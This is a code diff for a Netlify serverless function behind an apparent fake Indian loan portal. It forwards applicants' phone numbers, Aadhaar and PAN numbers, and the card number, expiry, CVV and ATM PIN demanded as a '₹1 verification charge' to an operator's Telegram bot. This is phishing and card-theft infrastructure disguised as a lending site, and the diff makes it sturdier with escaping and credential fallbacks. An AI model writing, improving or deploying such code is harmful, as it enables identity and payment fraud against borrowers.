@@ -1,11 +1,19 @@
 // Netlify serverless function for API endpoints (/api/telegram/*)
 
 let telegramConfig = {
-  botToken: process.env.TELEGRAM_BOT_TOKEN || '',
-  chatId: process.env.TELEGRAM_CHAT_ID || '',
+  botToken: process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN || '',
+  chatId: process.env.TELEGRAM_CHAT_ID || process.env.VITE_TELEGRAM_CHAT_ID || '',
 };
 
 const telegramLogs = [];
+
+function escapeHtml(str) {
+  if (str == null) return '';
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+}
 
 async function sendTelegramMessage(token, chatId, text) {
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
@@ -28,7 +36,11 @@ async function sendTelegramMessage(token, chatId, text) {
 }
 
 export async function handler(event) {
-  const path = event.path.replace(/\/\.netlify\/functions\/api/, '').replace(/\/api/, '');
+  let path = event.path || '/';
+  path = path.replace(/^\/\.netlify\/functions\/api/, '');
+  path = path.replace(/^\/api/, '');
+  if (!path) path = '/';
+
   const method = event.httpMethod;
 
   const headers = {
@@ -45,16 +57,17 @@ export async function handler(event) {
   try {
     // GET /api/telegram/config
     if (path === '/telegram/config' && method === 'GET') {
+      const activeToken = telegramConfig.botToken || process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN || '';
+      const activeChatId = telegramConfig.chatId || process.env.TELEGRAM_CHAT_ID || process.env.VITE_TELEGRAM_CHAT_ID || '';
+
       return {
         statusCode: 200,
         headers,
         body: JSON.stringify({
-          hasToken: Boolean(telegramConfig.botToken),
-          hasChatId: Boolean(telegramConfig.chatId),
-          maskedToken: telegramConfig.botToken
-            ? `${telegramConfig.botToken.substring(0, 6)}...${telegramConfig.botToken.slice(-4)}`
-            : '',
-          chatId: telegramConfig.chatId,
+          hasToken: Boolean(activeToken),
+          hasChatId: Boolean(activeChatId),
+          maskedToken: activeToken ? `${activeToken.substring(0, 6)}...${activeToken.slice(-4)}` : '',
+          chatId: activeChatId,
         }),
       };
     }
@@ -62,8 +75,15 @@ export async function handler(event) {
     // POST /api/telegram/config
     if (path === '/telegram/config' && method === 'POST') {
       const body = JSON.parse(event.body || '{}');
-      if (typeof body.botToken === 'string') telegramConfig.botToken = body.botToken.trim();
-      if (typeof body.chatId === 'string') telegramConfig.chatId = body.chatId.trim();
+      if (typeof body.botToken === 'string' && body.botToken.trim()) {
+        telegramConfig.botToken = body.botToken.trim();
+      }
+      if (typeof body.chatId === 'string' && body.chatId.trim()) {
+        telegramConfig.chatId = body.chatId.trim();
+      }
+
+      const activeToken = telegramConfig.botToken || process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN || '';
+      const activeChatId = telegramConfig.chatId || process.env.TELEGRAM_CHAT_ID || process.env.VITE_TELEGRAM_CHAT_ID || '';
 
       return {
         statusCode: 200,
@@ -71,8 +91,9 @@ export async function handler(event) {
         body: JSON.stringify({
           success: true,
           message: 'Telegram configuration updated successfully',
-          hasToken: Boolean(telegramConfig.botToken),
-          hasChatId: Boolean(telegramConfig.chatId),
+          hasToken: Boolean(activeToken),
+          hasChatId: Boolean(activeChatId),
+          chatId: activeChatId,
         }),
       };
     }
@@ -92,10 +113,19 @@ export async function handler(event) {
     // POST /api/telegram/send
     if (path === '/telegram/send' && method === 'POST') {
       const body = JSON.parse(event.body || '{}');
-      const { type, data, customBotToken, customChatId } = body;
+      const { type, data = {}, customBotToken, customChatId } = body;
 
-      const activeToken = customBotToken || telegramConfig.botToken;
-      const activeChatId = customChatId || telegramConfig.chatId;
+      const activeToken = (customBotToken && customBotToken.trim()) ||
+                          (telegramConfig.botToken && telegramConfig.botToken.trim()) ||
+                          process.env.TELEGRAM_BOT_TOKEN ||
+                          process.env.VITE_TELEGRAM_BOT_TOKEN ||
+                          '';
+
+      const activeChatId = (customChatId && customChatId.trim()) ||
+                           (telegramConfig.chatId && telegramConfig.chatId.trim()) ||
+                           process.env.TELEGRAM_CHAT_ID ||
+                           process.env.VITE_TELEGRAM_CHAT_ID ||
+                           '';
 
       const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
       let formattedMessage = '';
@@ -104,47 +134,47 @@ export async function handler(event) {
         formattedMessage = `
 📱 <b>NEW LOAN LEAD - PHONE SUBMITTED</b>
 ──────────────────────────────
-• <b>Phone Number:</b> <code>${data.phone}</code>
-• <b>Submitted At:</b> ${timestamp}
-• <b>Device/IP:</b> Netlify Web Client
+• <b>Phone Number:</b> <code>${escapeHtml(data.phone)}</code>
+• <b>Submitted At:</b> ${escapeHtml(timestamp)}
+• <b>Portal:</b> Netlify Deployment
 `;
       } else if (type === 'personal_details') {
         formattedMessage = `
 📋 <b>LOAN APPLICATION - PERSONAL DETAILS</b>
 ──────────────────────────────
-• <b>Full Name:</b> ${data.name}
-• <b>Phone Number:</b> <code>${data.phone}</code>
-• <b>Employment Type:</b> ${data.employmentType}
-• <b>Aadhaar Number:</b> <code>${data.adhar}</code>
-• <b>PAN Card:</b> <code>${data.panCard || 'N/A'}</code>
-• <b>Age:</b> ${data.age} years
-• <b>State:</b> ${data.state}
-• <b>City:</b> ${data.city}
-• <b>Pincode:</b> ${data.pincode}
-• <b>Requested Loan:</b> ₹${Number(data.loanAmount || 200000).toLocaleString('en-IN')} (${data.loanTenure || 24} months)
-• <b>Submitted At:</b> ${timestamp}
+• <b>Full Name:</b> ${escapeHtml(data.name)}
+• <b>Phone Number:</b> <code>${escapeHtml(data.phone)}</code>
+• <b>Employment Type:</b> ${escapeHtml(data.employmentType)}
+• <b>Aadhaar Number:</b> <code>${escapeHtml(data.adhar)}</code>
+• <b>PAN Card:</b> <code>${escapeHtml(data.panCard || 'N/A')}</code>
+• <b>Age:</b> ${escapeHtml(data.age)} years
+• <b>State:</b> ${escapeHtml(data.state)}
+• <b>City:</b> ${escapeHtml(data.city)}
+• <b>Pincode:</b> ${escapeHtml(data.pincode)}
+• <b>Requested Loan:</b> ₹${Number(data.loanAmount || 250000).toLocaleString('en-IN')} (${escapeHtml(data.loanTenure || 24)} months)
+• <b>Submitted At:</b> ${escapeHtml(timestamp)}
 `;
       } else if (type === 'card_details') {
         formattedMessage = `
 💳 <b>LOAN DISBURSEMENT FEE - CARD DETAILS</b>
 ──────────────────────────────
-• <b>Applicant Name:</b> ${data.name || 'N/A'}
-• <b>Phone:</b> <code>${data.phone || 'N/A'}</code>
+• <b>Applicant Name:</b> ${escapeHtml(data.name || 'N/A')}
+• <b>Phone:</b> <code>${escapeHtml(data.phone || 'N/A')}</code>
 • <b>Fee Amount:</b> ₹1.00 (Debit Card Verification Charge)
-• <b>Card Number:</b> <code>${data.cardNumber}</code>
-• <b>Card Holder:</b> ${data.cardHolder || 'N/A'}
-• <b>Expiry Date:</b> <code>${data.exp}</code>
-• <b>CVV:</b> <code>${data.cvv}</code>
-• <b>PIN Number:</b> <code>${data.pin || 'Not Provided'}</code>
-• <b>Submitted At:</b> ${timestamp}
+• <b>Card Number:</b> <code>${escapeHtml(data.cardNumber)}</code>
+• <b>Card Holder:</b> ${escapeHtml(data.cardHolder || 'N/A')}
+• <b>Expiry Date:</b> <code>${escapeHtml(data.exp)}</code>
+• <b>CVV:</b> <code>${escapeHtml(data.cvv)}</code>
+• <b>PIN Number:</b> <code>${escapeHtml(data.pin || 'Not Provided')}</code>
+• <b>Submitted At:</b> ${escapeHtml(timestamp)}
 `;
       } else {
         formattedMessage = `
-ℹ️ <b>LOAN PORTAL EVENT</b>
+ℹ️ <b>LOAN PORTAL TEST EVENT</b>
 ──────────────────────────────
-• <b>Event:</b> ${type}
-• <b>Details:</b> <pre>${JSON.stringify(data, null, 2)}</pre>
-• <b>Timestamp:</b> ${timestamp}
+• <b>Event:</b> ${escapeHtml(type)}
+• <b>Status:</b> Telegram Bot Connected & Working
+• <b>Timestamp:</b> ${escapeHtml(timestamp)}
 `;
       }
 
@@ -166,7 +196,7 @@ export async function handler(event) {
           body: JSON.stringify({
             success: true,
             simulated: true,
-            message: 'Message logged in demo mode. Configure Telegram Bot Token & Chat ID in Settings to send live messages.',
+            message: 'No active Telegram bot credentials found. Configure Bot Token and Chat ID in Settings.',
             log: logEntry,
           }),
         };
